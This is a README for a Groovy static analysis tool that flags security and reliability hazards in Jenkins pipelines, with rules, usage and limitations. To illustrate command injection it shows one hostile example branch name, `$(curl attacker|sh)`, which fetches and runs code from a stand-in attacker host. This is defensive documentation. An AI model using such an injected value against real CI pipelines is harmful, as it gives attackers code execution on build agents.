# Jenkins Pipeline Hazard Auditor

A Jenkinsfile can leak a credential, run a pull request title as a shell command or hold an executor for a week. It will still pass every syntax check Jenkins offers. This is a single Groovy file that parses Jenkinsfiles and shared library code with the real Groovy parser and reports those hazards before the pipeline runs.

**Language:** Groovy | **Lines:** 2304 | **Added:** 2026-11-15

## What this solves

Jenkins has a declarative linter, but it only tells you whether the pipeline is well formed. It says nothing about what the pipeline does. The problems that hurt in production are all valid syntax:

- `sh "curl -u ${USER}:${PASS} ..."` inside `withCredentials`. Groovy expands the secret before the shell starts, so the value lands in the process list and can slip past log masking. Jenkins prints a warning for this at run time, after the secret has already been used.
- `sh "git checkout ${env.CHANGE_BRANCH}"` in a multibranch job. A branch named `$(curl attacker|sh)` is a legal git ref. Now it is a command on your agent.
- A `@NonCPS` method that calls `sh`. It returns early with the wrong value and the build carries on.
- `def m = (text =~ /v(\d+)/)` followed by any step. The Matcher is not serializable, so the build dies with NotSerializableException, often only when the controller is busy or restarts.
- `input` inside `node`. One person on holiday and an executor is gone for a week.
- `catch (Exception e)` around a step. Clicking abort no longer aborts.

Jenkins Pipeline Hazard Auditor is a static analysis CLI for exactly this class of bug. It covers 23 rules across secrets, command injection, supply chain, controller side code, CPS serialization traps and steps that can hang forever. It reads declarative pipelines, scripted pipelines and `vars/*.groovy` shared library steps. It prints text, JSON, SARIF for GitHub code scanning or GitHub Actions annotations. It exits non zero so you can use it as a CI gate or a pre commit hook.

## Why I built it

Most Jenkins security write ups end with the same advice: use single quotes around shell commands that touch secrets. Everyone agrees and nobody checks. The existing checks come in two kinds. One is a regex over the file, which cannot tell a single quoted string from a double quoted one once there is a line continuation or a nested closure. The other is a full Jenkins instance you have to boot to ask it a question.

I wanted the check to understand the code the way Groovy does. A GString is a different syntax tree node from a plain string, so with the real parser there is no guessing about quotes. Scope matters too. `TOKEN` is a secret only inside the `withCredentials` block that binds it. `NEXUS_PSW` exists only because `environment { NEXUS = credentials('nexus') }` created it. A regex cannot know that. A tree walk with a frame stack can.

I also wanted fewer false alarms than the usual linter. A boolean or choice parameter cannot carry a shell payload, so the auditor reads the `parameters` block and stays quiet about those. `params.COUNT.toInteger()` is not an injection. A matcher that is set to null before the next step is fine. Each rule was written against the failure it is meant to catch, not against a pattern that looks similar.

Groovy was the obvious language. The parser that Jenkins itself uses ships inside the Groovy runtime, so the tool is one file with no dependencies and no build step.

## When to use it

- As a required check on pull requests that touch a Jenkinsfile or a shared library repository.
- Before migrating a pile of old scripted pipelines, to find the ones that only work by luck.
- When you take over a Jenkins instance and need to know which jobs can leak credentials or run attacker input.
- As a pre commit hook for teams that write pipeline code every day.
- In an audit, with `--format sarif`, so findings show up next to the code in GitHub code scanning.
- On a legacy repository with `--write-baseline` first, so only new hazards fail the build.

It is a static tool. It does not connect to Jenkins, it does not know which plugins you have installed and it cannot see values that only exist at run time.

## How it works

The entry point is `Main.main`, which calls `Main.execute`. That parses flags with `Config.parse`, runs `Engine.run` and hands the `Report` to `Renderer.render`.

**Discovery.** `Engine.discover` takes files as given and walks directories for `Jenkinsfile`, `Jenkinsfile.*`, `*.jenkinsfile` and `vars/*.groovy`, as decided by `Engine.isPipelineFile`. Folders listed in `Config.SKIP_DIRS` are skipped. If nothing is found the run stops with exit code 2, because a gate that scanned nothing must not pass.

**Parsing.** `Engine.parse` compiles each file only to `Phases.CONVERSION`. That gives a full syntax tree without resolving any class, so unknown steps, plugin classes and `@Library` imports do not break the parse. A syntax error becomes a `ParseFailure` and the run ends with exit code 3 unless you pass `--allow-unparsed`. Files over `Config.MAX_FILE_BYTES` are reported the same way and never silently skipped.

**Prepass.** `Prepass` walks the tree once to learn three things. It records the kind of every declared build parameter into `Taint.paramKinds`, covering both `parameters { string(name: ...) }` and the older `[$class: 'BooleanParameterDefinition']` map form. It collects every credential variable name through `Ast.bindingNames` and `Ast.environmentCredentials`. And it lists every assignment so `Taint.solveLocals` can run a fixed point over them. That is how `def branch = env.BRANCH_NAME`, then `def b2 = branch.trim()`, then `bat "git push origin " + b2` is still reported, with the message naming the original source.

**Taint.** `Taint.refs` walks one expression and returns `TaintRef` records of kind `SECRET`, `SCM` or `PARAM`. SCM sources come from `Vocabulary.SCM_ENV`, which covers multibranch, GitHub pull request builder, GitLab, Gerrit and Bitbucket variables. Comparisons are ignored. Calls listed in `Vocabulary.NEUTRALIZING_METHODS` and casts to types in `Vocabulary.NEUTRALIZING_TYPES` end the taint. If the value passes through one of your own functions first, the finding drops to low severity and names that function so you can check that it quotes.

**The audit walk.** `Auditor` extends `CodeVisitorSupport` and keeps a stack of `Frame` objects, one per enclosing call. `Auditor.makeFrame` fills in what each frame contributes: the secrets a `withCredentials` block binds, whether a `node`, `pipeline` or `stage` allocates an agent and whether a `timeout` is in force. Each check then asks the stack a question:

- `checkShell` handles `sh`, `bat`, `powershell` and `pwsh`. It reports interpolated secrets (JPH001), SCM values (JPH003) and free text parameters (JPH004), then scans the constant text of the command with `Vocabulary.TLS_OFF`, `Vocabulary.PIPE_TO_SHELL` and `Vocabulary.FORCED_SUCCESS`. `ShellScan.maskedProducer` is a small quote aware scanner that finds a pipe without pipefail.
- `checkLogging` reports secrets passed to `echo`, `error` and friends.
- `checkLibrarySpec` reads `@Library` annotations and `library` steps. No version is low, a branch from `Vocabulary.MUTABLE_REFS` is medium, a version built from a parameter is high.
- `checkControllerApis` and `visitConstructorCallExpression` report code that runs in the controller JVM: `"cmd".execute()`, `new File`, `Jenkins.instance`, `System.exit`, `Thread.sleep`.
- `checkContainers` reports unpinned images through `isUnpinnedImage` and host level flags through `Vocabulary.PRIVILEGED`.
- `checkWait` uses `agentState` and `timeoutCovered` to report `input` that holds an executor and waits with no timeout. It knows a declarative `input` directive runs before the stage agent but after a pipeline level agent.
- `visitBlockStatement` reports a discarded `returnStatus` and calls `checkNonSerializable`, which looks for a Matcher, JsonSlurper result, iterator or map view that is still in scope when a later step runs. Setting the variable to null first clears it.
- `visitTryCatchFinally` reports a broad catch around steps that never rethrows, unless an earlier clause already handles FlowInterruptedException.
- Inside a `@NonCPS` method, any step call or call to a CPS method in the same file is reported. Outside one, a closure handed to a method in `Vocabulary.CPS_UNSAFE_CLOSURE_METHODS` is reported.

**Suppression and baselines.** `SourceFile.indexSuppressions` reads `jph:ignore` comments. `Baseline.assignFingerprints` hashes the rule id, the file path and the trimmed source line, not the line number, so a baseline survives unrelated edits above the finding. `Output.writeAtomically` writes reports and baselines through a temp file and a rename.

## Usage

Run it with the Groovy runtime, version 3 or later.

```
groovy JenkinsPipelineHazardAuditor.groovy Jenkinsfile
groovy JenkinsPipelineHazardAuditor.groovy --fail-on high ci/ vars/
groovy JenkinsPipelineHazardAuditor.groovy --format sarif --out jph.sarif .
```

Without a Groovy install you can run it from the jars directly:

```
java -cp groovy-4.0.24.jar:groovy-json-4.0.24.jar groovy.ui.GroovyMain \
  JenkinsPipelineHazardAuditor.groovy --format github .
```

Adopt it on an old repository without fixing everything first:

```
groovy JenkinsPipelineHazardAuditor.groovy --write-baseline ci/jph-baseline.json .
groovy JenkinsPipelineHazardAuditor.groovy --baseline ci/jph-baseline.json .
```

Sample text output:

```
Jenkinsfile
  23:9  HIGH   JPH003 scm-value-interpolation
      sh gets a Groovy string with env.CHANGE_BRANCH expanded into the command text. ...
      > sh "git checkout ${env.CHANGE_BRANCH}"
      fix: Use a single quoted string and read the value from the environment, for example sh 'git checkout "$CHANGE_BRANCH"'.

1 file(s) scanned: 1 high, 0 medium, 0 low, 0 suppressed, 0 baselined, 0 unparsed
Result: FAIL (fail-on medium)
```

Silence one finding with a comment on the same line or the line above. Name the rule and say why:

```
// jph:ignore JPH003 branch names are validated by the webhook filter
sh "echo ${BRANCH_NAME}"
```

Options: `--format text|json|sarif|github`, `--out`, `--fail-on high|medium|low|none`, `--min-severity`, `--disable`, `--only`, `--step`, `--trusted-param`, `--baseline`, `--write-baseline`, `--include-groovy`, `--allow-unparsed`, `--list-rules` and `--help`.

Exit codes:

| Code | Meaning |
|---:|---|
| 0 | No active finding at or above `--fail-on` |
| 1 | At least one active finding at or above `--fail-on` |
| 2 | Bad flag, missing input, unreadable baseline or no pipeline files found |
| 3 | A file could not be parsed or read and nothing else failed the gate |

Rules:

| Id | Name | Default |
|---|---|---|
| JPH001 | secret-interpolation | high |
| JPH002 | secret-logged | medium |
| JPH003 | scm-value-interpolation | high |
| JPH004 | param-interpolation | medium |
| JPH005 | dynamic-code | high |
| JPH006 | library-pinning | medium |
| JPH007 | controller-side-api | medium |
| JPH008 | tls-verification-off | medium |
| JPH009 | pipe-to-shell | medium |
| JPH010 | privileged-container | medium |
| JPH011 | unpinned-image | low |
| JPH012 | controller-executor | medium |
| JPH020 | noncps-calls-step | high |
| JPH021 | cps-unsafe-closure | medium |
| JPH022 | nonserializable-local | medium |
| JPH023 | swallowed-abort | medium |
| JPH030 | input-holds-executor | medium |
| JPH031 | unbounded-wait | medium |
| JPH032 | no-timeout | low |
| JPH033 | no-build-discarder | low |
| JPH034 | ignored-exit-status | medium |
| JPH035 | pipe-masks-failure | low |
| JPH036 | failure-suppressed | low |

## Notes

- The parser is the one in your Groovy runtime. Jenkins still compiles pipelines with an older Groovy, so a file that uses newer syntax can parse here and fail on the controller. The reverse is rare.
- Local taint tracking is by variable name across the whole file and does not follow values through method parameters, closure parameters or return values. A value read from `sh(returnStdout: true)`, such as a commit message, is not treated as untrusted.
- A parameter that is never declared in the file is assumed to be free text. Use `--trusted-param` for parameters defined in job configuration that you know are validated.
- Step detection uses the built in list in `Vocabulary.STEPS`. Add your own plugin or shared library steps with `--step` so the CPS rules see them.
- JPH007 is correct but noisy in trusted shared libraries that are meant to call the Jenkins API. Disable it for those paths with `--disable JPH007`.
- JPH021 covers the closure methods I know to misbehave under CPS, with `sort` being the documented case in JENKINS-44924. On a recent workflow-cps plugin some of the others may work.
- JPH032 for scripted pipelines stays quiet if any `timeout` appears inside the `node` block, even one that covers only part of it.
- Shell text checks only see the constant parts of a command. A flag that arrives through a variable is invisible.
- When findings and parse failures both exist the exit code is 1. The report still lists every file that could not be analysed.
- Suppressed findings are left out of SARIF. Baselined findings are included with `baselineState` set to `unchanged`.
- The tool only reads the files you point it at, plus the baseline. It makes no network calls.
